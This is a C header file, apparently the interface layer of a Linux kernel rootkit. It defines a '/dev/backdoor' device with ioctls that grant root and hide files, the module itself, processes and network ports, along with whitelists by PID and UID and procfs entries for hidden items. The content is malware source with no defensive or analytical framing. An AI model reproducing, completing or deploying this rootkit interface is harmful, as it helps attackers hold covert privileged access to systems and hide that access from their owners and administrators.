#ifndef BDOOR_COMMON_LIB
#define BDOOR_COMMON_LIB 1
#include <asm/ioctl.h>

#ifndef __KERNEL__
#include <sys/types.h>
#include <stdint.h>
#include <stdbool.h>
#else
#include <linux/types.h>
#include <linux/net.h>
#endif

#define BDOOR_DEV_MINOR 42
#define BDOOR_DEV_NAME "backdoor"
#define BDOOR_DEV_PATH "/dev/backdoor"

#ifndef __KERNEL__
#define __u16 uint16_t
#endif

struct hide_request;
struct dentry_identifier;
struct whitelist_entry;
struct comm_name;

//ioctls for our interface
#define ROOT_IOCTL         _IO('k', 1)
#define UNROOT_IOCTL       _IO('k', 2)
#define URAND_IOCTL        _IO('k', 3)
#define HIDE_IOCTL         _IOW('k', 4, struct hide_request)
#define SHOW_IOCTL         _IOW('k', 5, struct hide_request)
#define LIST_HIDDEN_IOCTL  _IO('k', 6)
#define INJECT_IOCTL       _IO('k', 7)
#define REPLACE_IOCTL      _IO('k', 8)
#define HIDE_MOD_IOCTL     _IO('k', 9)
#define SHOW_MOD_IOCTL     _IO('k', 10)
#define WHIT_ADD_IOCTL     _IOW('k', 11, struct white_request)
#define WHIT_REM_IOCTL     _IOW('k', 12, struct white_request)
#define WHIT_SHOW_IOCTL    _IO('k', 13)
#define CHANGE_COMM_IOCTL  _IOW('k', 14, struct comm_name)
#define HIDE_PORT_IOCTL    _IOW('k', 15, struct sock_request)
#define SHOW_PORT_IOCTL    _IOW('k', 16, struct sock_request)


#define procfs_file_name "hidden_files"
#define procfs_whitelist_name "whitelist"
#define procfs_socket_blacklist_name "sock_blist"

static const char *white_type_names[] = {
	"PROCNAME",
	"PID",
	"UID",
	"GID",
};

enum white_type {
	INVALID = -1,
	PROCNAME = 0,
	PID = 1,
	UID = 2,
	GID = 3,
};

struct whitelist_entry {
	enum white_type wtype;
	union {
		char name[16];
		unsigned int id;
	};
};

struct white_request {
	int count;
	struct whitelist_entry *entries;
};

struct dentry_identifier {
	ino_t parent_ino;
#ifdef __KERNEL__
	dev_t device;
#else
	uint32_t device;
#endif
        unsigned int name_len;
	char name[256];
}__attribute__((packed));


struct hide_request {
	int count;
	struct dentry_identifier *idents;
};

struct comm_name {
	char name[16];
};


static const char *rkit_sock_type_names[] = {
	"LOCAL",
	"SOURCE",
	"DEST",
};

enum rkit_sock_type {
	LOCAL = 0,
        SOURCE = 1,
        DEST = 2,
};


static const bool valid_sock_types[] = {
	false,
	true,
	true,
	true,
	true,
	true,
	true,
	false,
	false,
	false,
	true,
};

static const char *sock_type_names[] = {
	"NONE",
	"STREAM",
	"DGRAM",
	"RAW",
	"RDM",
	"SEQPACKET",
	"DCCP",
	"NONE",
	"NONE",
	"NONE",
	"PACKET",
};

struct sock_id {
	enum rkit_sock_type type;
#ifdef __KERNEL__
	enum sock_type stype;
#else
	enum __socket_type stype;
#endif
	__u16 port_no;
}__attribute__((packed));



struct sock_request {
	int count;
	struct sock_id *socks;
};
#endif
